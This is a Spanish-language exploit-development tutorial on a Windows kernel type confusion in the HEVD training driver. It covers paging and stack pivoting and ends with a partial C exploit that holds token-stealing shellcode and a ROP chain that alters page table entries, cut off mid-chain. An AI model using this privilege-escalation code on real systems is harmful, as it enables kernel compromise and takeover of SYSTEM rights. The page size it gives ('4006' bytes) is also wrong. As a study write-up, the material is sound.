<p>Según <a href="https://en.wikipedia.org/wiki/Memory_paging">Wikipedia</a>, al utilizar este esquema (paginación), el sistema operativo obtiene información en bloques llamados páginas. Por ejemplo, en Windows una página tiene 4 KB (4006 o 0x1000 bytes).</p>
<p>Lo que hace el direccionamiento virtual es permitir que el kernel haga que una dirección física determinada parezca otra dirección, la dirección virtual.</p>
<p><strong>wafzsucks</strong> lo expresó perfectamente, es por eso que cuando se carga un juego, los fanáticos comienzan y se usa mucha memoria incluso antes de que comience el juego. Esto se debe a que la memoria se asigna y se obtiene mientras el juego se carga en dicha memoria.</p>
<p>Con el uso de <em>VirtualAlloc()</em> en Windows y <em>mmap()</em> en Linux, podemos mapear un rango de memoria virtual en una dirección definida. Es por eso que esta solución es un enfoque sólido para el pivotamiento de el stack.</p>
<h2 id="memoria-virtual">Memoria Virtual</h2>
<p>La imagen de abajo está tomada del blog de <a href="https://wafzsucks.medium.com/how-a-simple-k-typeconfusion-took-me-3-months-long-to-create-a-exploit-f643c94d445f">wafzsucks</a> blog).</p>
<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/vm.png" alt="alt text"></p>
<p>Podemos ver en la imagen de arriba que una dirección virtual está asignada a múltiples regiones en la memoria física. En corto, el sistema operativo gestiona los espacios de direcciones virtuales y la asignación de memoria real. El hardware de traducción de direcciones en la CPU, a menudo denominado unidad de administración de memoria (MMU), traduce automáticamente direcciones virtuales en direcciones físicas.</p>
<p>Según <a href="https://en.wikipedia.org/wiki/Virtual_memory">Wikipedia</a>, los beneficios de la memoria virtual incluyen:</p>
<ul>
<li>Las aplicaciones no tienen que administrar el espacio de memoria compartida</li>
<li>Capacidad de compartir la memoria utilizada por las librerias entre procesos.</li>
<li>Mayor seguridad debido al aislamiento de la memoria.</li>
</ul>
<p>Y conceptualmente poder utilizar más memoria de la que podría estar disponible físicamente, utilizando la técnica de paginación o segmentación.</p>
<h2 id="sumario-de-memoria-paginada">Sumario de Memoria Paginada</h2>
<p>Cuando escuchamos las palabras <code>memoria paginada</code> (Paged Memory) nos referimos a una técnica en la que el sistema operativo divide la memoria de un programa o sistema en bloques fijos llamados páginas (como sabemos). A continuación se muestran algunos conceptos clave a tener en cuenta con la memoria paginada:</p>
<ul>
<li>Tabla de páginas (Page Table)
<ul>
<li>Los sistemas operativos mantienen una estructura de información conocida como tabla de páginas. Esta tabla realiza un seguimiento de la asignación entre las direcciones de memoria virtual utilizadas por un programa y la ubicación de la dirección de memoria física donde se almacenan la información.</li>
</ul>
</li>
<li>Memoria virtual (Virtual Memory)
<ul>
<li>Como se mencionó anteriormente, así es como los programas interactúan con la memoria física sin tocarla directamente. Básicamente traducir direcciones virtuales a direcciones físicas.</li>
</ul>
</li>
<li>Fallos de página (Page Faults)
<ul>
<li>Cuando un programa accede a una página de memoria virtual que no está actualmente en la memoria física, se produce una falla de página. Desde aquí el control se transfiere del programa al sistema operativo.</li>
</ul>
</li>
<li>Paginación por demanda (Demand Paging)
<ul>
<li>La mayoría de los sistemas operativos utilizan paginación exigente, que es donde las páginas sólo se cargan en la memoria cuando es necesario. Esto es para conservar la memoria física cargando SOLO páginas que se están utilizando activamente.</li>
</ul>
</li>
<li>Reemplazo de página (Page Replacement)
<ul>
<li>Si la memoria física está llena, es posible que el sistema operativo deba elegir qué páginas eliminar de la memoria para dejar espacio para páginas nuevas.</li>
</ul>
</li>
<li>Tamaño de página (Page Size)
<ul>
<li>El tamaño de cada página es un factor crucial en la eficiencia de la gestión de la memoria. Un tamaño de página más pequeño puede conducir a una administración de memoria más detallada, pero también puede generar una mayor sobrecarga debido a una tabla de páginas más grande. Un tamaño de página mayor puede reducir el tamaño de la tabla, pero puede provocar que se carguen más datos en la memoria incluso si solo se necesita una pequeña parte.</li>
</ul>
</li>
</ul>
<h1 id="probando-la-teoría">Probando la Teoría</h1>
<p>Revisemos nuestro ejemplo de código.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  lpvAllocTarget <span style="color:#f92672">=</span> (LPVOID)<span style="color:#ae81ff">0xF6C875C0</span>;
</span></span><span style="display:flex;"><span>  lpvAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>((lpvAllocTarget <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>),
</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x10000</span>,
</span></span><span style="display:flex;"><span>                               (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
</span></span><span style="display:flex;"><span>                               PAGE_READWRITE);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvAllocation <span style="color:#f92672">==</span> NULL)         
</span></span><span style="display:flex;"><span>  { 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectId <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)lpvAllocation;
</span></span><span style="display:flex;"><span>  UserTypeConfusionObject.ObjectType <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)lpvNtKrnl <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x32e4fe</span>; <span style="color:#75715e">// mov esp, 0xF6C875C0 ; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering Type Confusion</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
</span></span><span style="display:flex;"><span>                  TYPE_CONFUSION,
</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>UserTypeConfusionObject,
</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">sizeof</span>(UserTypeConfusionObject),
</span></span><span style="display:flex;"><span>                  NULL,
</span></span><span style="display:flex;"><span>                  <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                  <span style="color:#f92672">&amp;</span>dwBytesReturned,
</span></span><span style="display:flex;"><span>                  NULL);
</span></span></code></pre></div><p>Si verificamos el PTE de la nueva dirección de stack, veremos que <strong>NO ES</strong> una entrada de página válida.</p>
<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/pte.png" alt="alt text"></p>
<p>Que significa que el control se le dará al kernel y fallaremos!</p>
<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/crash2.png" alt="alt text"></p>
<p>Esto es por la <strong>paginación de demanda</strong> mencionada anteriormente. Para que esta sea una página válida, podemos intentar escribir en la página anterior para evitar el <strong>error de página</strong>, ya que entonces estará en uso. Ate intentarlo!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  lpvAllocTarget <span style="color:#f92672">=</span> (LPVOID)<span style="color:#ae81ff">0xF6C875C0</span>;
</span></span><span style="display:flex;"><span>  lpvAllocation <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>((lpvAllocTarget <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span>),
</span></span><span style="display:flex;"><span>                               <span style="color:#ae81ff">0x10000</span>,
</span></span><span style="display:flex;"><span>                               (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
</span></span><span style="display:flex;"><span>                               PAGE_READWRITE);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvAllocation <span style="color:#f92672">==</span> NULL)               
</span></span><span style="display:flex;"><span>  { 
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Failed to allocate memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Successfully created allocation: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpvAllocation);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Writing random buffer to prevous page</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlFillMemory</span>((lpvAllocTarget<span style="color:#f92672">-</span><span style="color:#ae81ff">0x1000</span>), <span style="color:#ae81ff">0x1000</span>, <span style="color:#e6db74">&#39;A&#39;</span>);
</span></span></code></pre></div><p>Esta vez, cuando llegamos al punto de interrupción, podemos ver que la página es válida :)</p>
<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/ptev.png" alt="alt text"></p>
<p>Sin embargo, todavía tenemos un choque? Aquí es donde entra <code>VirtualLock</code>.</p>
<p><img src="/0x06-Approaching-Modern-Windows-Kernel-Type-Confusions/toohigh.PNG" alt="alt text"></p>
<p>Sin embargo, todavía tengo un choque! Según la información del blog de Kristal-G, parece que esta dirección es demasiado alta. Esto también se muestra en el error real anterior: con eso decidí cambiar mi gadget de pivote de stack.</p>
<h1 id="explotación">Explotación</h1>
<p>Después de llorar un rato logré crear un exploit seguro como se muestra a abajo:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntdef.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;shlwapi.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define TYPE_CONFUSION 0x222023
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Structure used by Type Confusion */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USER_TYPE_CONFUSION_OBJECT {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ObjectId;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> ObjectType;
</span></span><span style="display:flex;"><span>} USER_TYPE_CONFUSION_OBJECT, <span style="color:#f92672">*</span>PUSER_TYPE_CONFUSION_OBJECT;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GetKernelModuleBase():
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Function used to obtain kernel module address */</span>
</span></span><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">GetKernelModuleBase</span>(PCHAR pKernelModule)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> pcDriver[<span style="color:#ae81ff">1024</span>]    <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
</span></span><span style="display:flex;"><span>  LPVOID lpvTargetDriver <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  LPVOID <span style="color:#f92672">*</span>lpvDrivers     <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>  DWORD dwCB             <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  DWORD dwDrivers        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  DWORD i                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, dwCB, <span style="color:#f92672">&amp;</span>dwCB);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwCB <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  lpvDrivers <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwCB <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(LPVOID));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lpvDrivers <span style="color:#f92672">==</span> NULL)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EnumDeviceDrivers</span>(lpvDrivers, dwCB, <span style="color:#f92672">&amp;</span>dwCB))
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    dwDrivers <span style="color:#f92672">=</span> dwCB <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(LPVOID);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dwDrivers; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetDeviceDriverBaseNameA</span>(lpvDrivers[i], pcDriver, <span style="color:#66d9ef">sizeof</span>(pcDriver)))
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">StrStrA</span>(pcDriver, pKernelModule) <span style="color:#f92672">!=</span> NULL)
</span></span><span style="display:flex;"><span>          lpvTargetDriver <span style="color:#f92672">=</span> lpvDrivers[i];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(lpvDrivers);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> lpvTargetDriver;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">WriteGadgets</span>(LPVOID lpvNt, LPVOID lpvBuffer)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>rop <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(lpvBuffer);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> nt <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)(lpvNt);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8_t</span> sc[<span style="color:#ae81ff">129</span>] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xb2</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x04</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x2d</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xeb</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0xb8</span>, <span style="color:#ae81ff">0x04</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// sickle-tool -p windows/x64/kernel_sysret -f num (71)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xa1</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x88</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x90</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x8a</span>, <span style="color:#ae81ff">0x68</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x9a</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0xa2</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0xaa</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xf8</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x0f</span>, 
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x07</span> };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  LPVOID shellcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, <span style="color:#66d9ef">sizeof</span>(sc), MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">RtlCopyMemory</span>(shellcode, sc, <span style="color:#ae81ff">129</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Prepare RDX register for later. This is needed for the XOR operation */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40ed4e</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000008</span>; <span style="color:#75715e">// Set RDX to 0x08, we will need this to accomplish the XOR
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span>      <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     userland code. The setup is as follows:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       RAX -&gt; VOID *MiGetPteAddress(
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         ( RCX == PTE / Userland Code )
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       );
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Once the call is complete RAX should contain the pointer to our PTE. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x57699c</span>;       <span style="color:#75715e">// pop rcx ; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)shellcode; <span style="color:#75715e">// *shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x24aaec</span>;       <span style="color:#75715e">// MiGetPteAddress()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30fcf3</span>; <span style="color:#75715e">// sub rax, rdx ; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x54f344</span>; <span style="color:#75715e">// push rax ; pop rbx ; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#f92672">*</span>rop<span style="color:#f92672">++</span> <span style="color:#f92672">=</span> nt <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40ed4e</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret
